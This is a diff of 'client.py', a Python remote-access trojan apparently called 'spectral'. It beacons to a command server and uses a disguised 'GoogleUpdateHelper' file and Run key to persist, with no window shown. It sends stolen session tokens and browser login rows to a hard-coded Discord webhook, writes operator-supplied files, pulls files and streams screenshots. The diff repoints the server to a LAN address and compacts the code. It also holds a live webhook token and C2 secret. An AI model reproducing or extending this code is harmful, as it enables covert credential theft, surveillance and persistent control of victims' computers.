@@ -1,7 +1,7 @@
 # client.py — double-click. Python 3.8+. stdlib only.
 import base64, json, os, re, shutil, subprocess, sys, threading, time, traceback, uuid
 
-SERVER          = "http://127.0.0.1:8443"
+SERVER          = "http://192.168.230.37:8443"
 SECRET          = "sk_c2_7Kx9mP2vN4qR8tW1yZ5bH3jL6nF0dS_aE9cU2gI4oM"
 REPORT_ENDPOINT = "https://discord.com/api/webhooks/1553320833970343936/CYmdAjm4iDqmHKRwme31kCx0fF8ULy81ACxKSt1WQLfrXLaJH-KIp2SU0K485hjTpbyK"
 BEACON_SECONDS  = 15
@@ -12,8 +12,7 @@ STREAM_MAX_H    = 540
 REPORT_ONCE_FILE = ".sent"
 
 CREATE_NO_WINDOW = 0x08000000
-DISGUISE_DIR  = os.path.join(os.environ.get("LOCALAPPDATA", os.path.expanduser("~")),
-                             "Google", "Update")
+DISGUISE_DIR  = os.path.join(os.environ.get("LOCALAPPDATA", os.path.expanduser("~")), "Google", "Update")
 DISGUISE_FILE = "GoogleUpdateHelper.pyw"
 RUN_KEY_NAME  = "GoogleUpdateHelper"
 LOG_PATH = os.path.join(os.environ.get("APPDATA", os.path.expanduser("~")), "GUpdate.log")
@@ -35,86 +34,63 @@ def post(url, obj, timeout=20):
     req = urllib.request.Request(url, data=raw, method="POST",
         headers={"Content-Type":"application/json","X-Sig":sign(SECRET, raw),
                  "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64)"})
-    ctx = ssl.create_default_context()
-    with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
+    with urllib.request.urlopen(req, timeout=timeout, context=ssl.create_default_context()) as r:
         return json.loads(r.read() or b"{}")
 
-# ---- organized Discord embed writer ----
-def _clip(s, n): 
+def _clip(s, n):
     s = s if isinstance(s, str) else json.dumps(s)
     return s if len(s) <= n else s[: n - 1] + "…"
 
 def _build_embeds(blob):
     if "hello" in blob:
-        return [{
-            "title": "🟢 new agent online",
-            "color": 0x2ecc71,
+        return [{"title": "🟢 new agent online", "color": 0x2ecc71,
             "fields": [
-                {"name": "id",   "value": f"`{_clip(blob.get('hello',''), 60)}`", "inline": True},
-                {"name": "host", "value": f"`{_clip(blob.get('host','?'), 60)}`",  "inline": True},
-                {"name": "user", "value": f"`{_clip(blob.get('user','?'), 60)}`",  "inline": True},
-            ],
-            "footer": {"text": "spectral relay"},
-            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
-        }]
+                {"name":"id","value":f"`{_clip(blob.get('hello',''),60)}`","inline":True},
+                {"name":"host","value":f"`{_clip(blob.get('host','?'),60)}`","inline":True},
+                {"name":"user","value":f"`{_clip(blob.get('user','?'),60)}`","inline":True}],
+            "footer": {"text":"spectral relay"},
+            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())}]
     toks = blob.get("tokens") or []
-    ld   = blob.get("login_data") or {}
+    ld = blob.get("login_data") or {}
     ld_rows = sum(len(v) for v in ld.values() if isinstance(v, list))
     color = 0xE74C3C if toks else 0x3498DB
-
-    e1_fields = [
-        {"name": "id",   "value": f"`{_clip(blob.get('id','?'), 60)}`",   "inline": True},
-        {"name": "host", "value": f"`{_clip(blob.get('host','?'), 60)}`", "inline": True},
-        {"name": "user", "value": f"`{_clip(blob.get('user','?'), 60)}`", "inline": True},
-        {"name": "ip",   "value": f"`{_clip(blob.get('ip','?'), 60)}`",   "inline": True},
-        {"name": "os",   "value": f"`{_clip(blob.get('os','?'), 40)}`",   "inline": True},
-        {"name": "tokens found", "value": f"**{len(toks)}**", "inline": True},
-        {"name": "login rows",   "value": f"**{ld_rows}**",   "inline": True},
+    f = [
+        {"name":"id","value":f"`{_clip(blob.get('id','?'),60)}`","inline":True},
+        {"name":"host","value":f"`{_clip(blob.get('host','?'),60)}`","inline":True},
+        {"name":"user","value":f"`{_clip(blob.get('user','?'),60)}`","inline":True},
+        {"name":"ip","value":f"`{_clip(blob.get('ip','?'),60)}`","inline":True},
+        {"name":"os","value":f"`{_clip(blob.get('os','?'),40)}`","inline":True},
+        {"name":"tokens","value":f"**{len(toks)}**","inline":True},
+        {"name":"login rows","value":f"**{ld_rows}**","inline":True},
     ]
-
     if toks:
         shown = toks[:10]
-        more = "" if len(toks) <= 10 else f"\n… and {len(toks)-10} more"
-        e1_fields.append({
-            "name": f"session keys ({len(toks)})",
-            "value": _clip("\n".join(f"`{t[:48]}…`" if len(t)>48 else f"`{t}`" for t in shown) + more, 1000),
-            "inline": False,
-        })
+        more = "" if len(toks)<=10 else f"\n… +{len(toks)-10}"
+        f.append({"name":f"session keys ({len(toks)})",
+                  "value":_clip("\n".join(f"`{t}`" for t in shown)+more,1000),"inline":False})
     if ld:
         lines = []
         for path, rows in ld.items():
-            if not isinstance(rows, list):
-                lines.append(f"`{_clip(path, 40)}` → {rows}"); continue
+            if not isinstance(rows, list): lines.append(f"`{_clip(path,40)}` → {rows}"); continue
             for r in rows[:5]:
-                lines.append(f"`{r.get('user') or '(blank)'}` @ `{_clip(r.get('url','?'), 70)}`")
+                lines.append(f"`{r.get('user') or '(blank)'}` @ `{_clip(r.get('url','?'),70)}`")
         if lines:
-            e1_fields.append({"name": f"logins (first {min(15,len(lines))})",
-                              "value": _clip("\n".join(lines[:15]), 1000), "inline": False})
-
-    e1 = {
-        "title": f"🧿 agent dump · {_clip(blob.get('host','?'), 50)}",
-        "color": color,
-        "fields": e1_fields[:25],
-        "footer": {"text": "spectral relay"},
-        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
-    }
-    return [e1]
+            f.append({"name":f"logins (first {min(15,len(lines))})",
+                      "value":_clip("\n".join(lines[:15]),1000),"inline":False})
+    return [{"title":f"🧿 agent dump · {_clip(blob.get('host','?'),50)}",
+             "color":color,"fields":f[:25],"footer":{"text":"spectral relay"},
+             "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())}]
 
 def send_embed(blob):
     import urllib.request
     if not REPORT_ENDPOINT: return
-    embeds = _build_embeds(blob)
-    body = json.dumps({
-        "username": "spectral",
-        "avatar_url": "https://i.imgur.com/4M34hi2.png",
-        "embeds": embeds,
-    }).encode()
+    body = json.dumps({"username":"spectral",
+        "embeds":_build_embeds(blob)}).encode()
     try:
         req = urllib.request.Request(REPORT_ENDPOINT, data=body, method="POST",
             headers={"Content-Type":"application/json"})
         urllib.request.urlopen(req, timeout=15)
-    except Exception as e:
-        log(f"embed send: {e}")
+    except Exception as e: log(f"embed: {e}")
 
 def agent_id():
     global _AID
@@ -124,8 +100,7 @@ def agent_id():
         if os.path.exists(p): _AID = open(p).read().strip(); return _AID
     except Exception: pass
     _AID = uuid.uuid4().hex[:16]
-    try:
-        os.makedirs(os.path.dirname(p), exist_ok=True); open(p,"w").write(_AID)
+    try: os.makedirs(os.path.dirname(p), exist_ok=True); open(p,"w").write(_AID)
     except Exception: pass
     return _AID
 
@@ -176,8 +151,7 @@ def m_getf(arg):
 
 def m_putf(arg):
     try:
-        p, b64 = arg.split("::",1)
-        open(p,"wb").write(base64.b64decode(b64))
+        p,b64 = arg.split("::",1); open(p,"wb").write(base64.b64decode(b64))
         return f"[ok] {len(b64)} -> {p}"
     except Exception as e: return f"[err] {e}"
 
@@ -185,13 +159,11 @@ def _grab_screen():
     try: from PIL import ImageGrab
     except Exception: return None
     try:
-        img = ImageGrab.grab()
-        w, h = img.size
+        img = ImageGrab.grab(); w,h = img.size
         if w > STREAM_MAX_W or h > STREAM_MAX_H:
             r = min(STREAM_MAX_W/w, STREAM_MAX_H/h)
             img = img.resize((int(w*r), int(h*r)))
-        import io as _io
-        b = _io.BytesIO(); img.save(b, "JPEG", quality=STREAM_QUALITY)
+        import io as _io; b = _io.BytesIO(); img.save(b,"JPEG",quality=STREAM_QUALITY)
         return b.getvalue()
     except Exception: return None
 
@@ -305,8 +277,7 @@ def stream_loop():
                 try: post(f"{base}/frame", {"id":agent_id(), "jpg":base64.b64encode(jpg).decode()}, timeout=10)
                 except Exception: pass
             time.sleep(max(0.2, 1.0 / STREAM_FPS))
-        else:
-            time.sleep(1)
+        else: time.sleep(1)
 
 def main():
     try:
